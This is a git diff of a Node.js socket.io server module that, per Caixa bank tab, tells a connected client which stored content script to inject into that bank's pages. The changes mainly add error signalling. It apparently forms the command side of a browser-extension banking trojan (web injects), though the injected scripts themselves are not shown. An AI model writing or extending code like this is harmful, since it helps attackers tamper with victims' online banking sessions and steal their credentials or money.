@@ -2,7 +2,6 @@
 
 var fs = require('fs');
 var appPath = process.cwd();
-var util = require(appPath+'/lib/util');
 var contentPath = appPath+'/banks/caixa/server/content';
 var fs = require('fs');
 var path = require('path');
@@ -38,29 +37,49 @@ module.exports = function(app, io, db){
 		});
 
 		socket.on('onTabUpdated', function(tab){
-			if(!tab || !tab.url) return;
+			if(!tab || !tab.url || !tab.id) {
+				socket.emit('err_InjectContentScriptByTabId');
+				return;
+			};
 
-			var hostTabUrl = tab.url.split('/')[2];
 			// Checking if this tab.url is from caixa
-			if(hosts === hostTabUrl){
+			var hostTabUrl = tab.url.split('/')[2];
+			if(hosts !== hostTabUrl){
 				// Checking the current page
-				socket.emit('injectContentScriptByTabId', tab.id, contentScripts.checkPage);
+				socket.emit('err_InjectContentScriptByTabId');
+				return;
 			}
+
+			// Checking the current page
+			socket.emit('injectContentScriptByTabId', tab.id, contentScripts.checkPage);
+			
 		});
 
 
 		socket.on('injectContentScript', function(sender, request, response){
 			// Check if sender and sender.tab params exists
-			if(!sender || !sender.tab ) return;
+			if(!sender || !sender.tab || !sender.tab.id){
+				socket.emit('err_InjectContentScriptByTabId');
+				return;
+			}
 
 			// Check if request and request.data params exists
-			if(!request || !request.data ) return;
+			if(!request || !request.data ){
+				socket.emit('err_InjectContentScriptByTabId');
+				return;
+			};
 
 			// Check if request.data.homeName is CEF
-			if(request.data.homeName !== homeName) return;
+			if(request.data.homeName !== homeName){
+				socket.emit('err_InjectContentScriptByTabId');
+				return;
+			};
 
 			// Check if request.data.pageName is exists
-			if(!request.data.pageName ) return;
+			if(!request.data.pageName ){
+				socket.emit('err_InjectContentScriptByTabId');
+				return;
+			};
 
 
 			var tab = sender.tab;
@@ -69,10 +88,13 @@ module.exports = function(app, io, db){
 
 			// Check folder content contains respective pageName
 			var keys = Object.keys(contentScripts);
-			if(keys.indexOf(pageName) >= 0){
-				// pageName exists, injecting content_script on page
-				socket.emit('injectContentScriptByTabId', tab.id, contentScripts[pageName]);
+			if(keys.indexOf(pageName) == -1){
+				socket.emit('err_InjectContentScriptByTabId');
+				return;
 			}
+
+			// pageName exists, injecting content_script on page
+			socket.emit('injectContentScriptByTabId', tab.id, contentScripts[pageName]);
 		});
 
 		socket.on('pulseConnectionPage', function(sender, request, response){
@@ -104,7 +126,7 @@ module.exports = function(app, io, db){
 			console.log(request);
 		});
 
-		socket.on('disconnect', function(socket){
+		socket.on('disconnect', function(){
 			console.log(socket.id+' desconectado');
 		});
 	});
